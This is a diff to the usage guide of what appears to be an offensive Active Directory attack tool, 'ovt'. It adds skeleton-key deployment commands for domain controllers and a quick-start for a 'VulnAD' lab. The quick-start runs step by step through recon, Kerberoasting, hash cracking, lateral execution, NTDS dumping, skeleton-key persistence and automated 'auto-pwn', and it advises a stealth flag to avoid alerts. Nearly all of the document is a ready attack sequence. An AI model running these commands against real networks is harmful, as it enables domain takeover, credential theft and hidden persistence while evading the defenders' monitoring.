@@ -1131,6 +1131,11 @@ ovt dump -t DC ntds -d DOMAIN -u DA -p PASS            # Dump NTDS
 ovt forge golden --krbtgt-hash HASH --domain-sid SID   # Golden ticket
 ovt laps -H DC -d DOMAIN -u USER -p PASS               # Read LAPS
 
+# === POST-EXPLOITATION ===
+ovt module run skeleton-key -t DC -d DOMAIN -u DA -p PASS        # Deploy skeleton key (native DLL)
+ovt module run skeleton-key -t DC --method powershell -d ...     # PowerShell reflection deploy
+ovt forge skeleton -t DC -d DOMAIN -u DA -p PASS                 # Skeleton key via forge
+
 # === AUTOPWN ===
 ovt auto-pwn -H DC -d DOMAIN -u USER -p PASS           # Full killchain
 ovt wizard -t DA --dc-host DC -d DOMAIN -u USER        # Guided mode
@@ -1140,4 +1145,62 @@ ovt doctor                                              # Health check
 ovt report -o report.pdf --format pdf                   # Generate report
 ovt tui --domain DOMAIN                                 # Launch TUI
 ```
+
+---
+
+## VulnAD Quick-Start
+
+For the VulnAD lab environment. IPs baked in so you don't have to think.
+
+```
+Kali (attacker)        : 192.168.6.20
+WS2025 DC (dc01)       : 192.168.6.10
+WS2025 Member (ws01)   : 192.168.5.145
+```
+
+### Pre-configured
+
+A TOML config ships at `configs/vulnad.toml`:
+
+```bash
+ovt auto-pwn --config configs/vulnad.toml
+```
+
+### Manual commands
+
+```bash
+# Phase 1: Recon (no creds needed first)
+ovt enum pre -H 192.168.6.10
+ovt enum anonymous -H 192.168.6.10
+
+# Phase 2: Full enumeration (with creds)
+ovt enum all -H 192.168.6.10 -d vulnad.local -u <user> -p '<pass>'
+
+# Phase 3: Kerberoast
+ovt kerberos roast -H 192.168.6.10 -d vulnad.local -u <user> -p '<pass>'
+
+# Phase 4: Crack hashes
+ovt crack --file ./loot/kerberoast_hashes.txt --mode thorough
+
+# Phase 5: Lateral to member server
+ovt exec -t 192.168.5.145 -c "whoami /all" -d vulnad.local -u <user> -p '<pass>'
+
+# Phase 6: DCSync (if you got DA)
+ovt dump -t 192.168.6.10 ntds -d vulnad.local -u <da_user> -p '<da_pass>'
+
+# Phase 7: Skeleton key (native DLL, post-DA)
+ovt module run skeleton-key -t 192.168.6.10 -d vulnad.local -u <da_user> -p '<da_pass>'
+
+# Phase 8: Report
+ovt report --format pdf --output vulnad-report.pdf
+```
+
+### Full auto-pwn against VulnAD
+
+```bash
+ovt auto-pwn -H 192.168.6.10 -d vulnad.local -u <user> -p '<pass>' --stealth
+```
+
+The `--stealth` flag is recommended on WS2025 — LDAP signing and SMB signing are required by default on new AD deployments. Overthrone handles both, but stealth mode avoids the noisy paths that trigger channel-binding alerts.
+
 
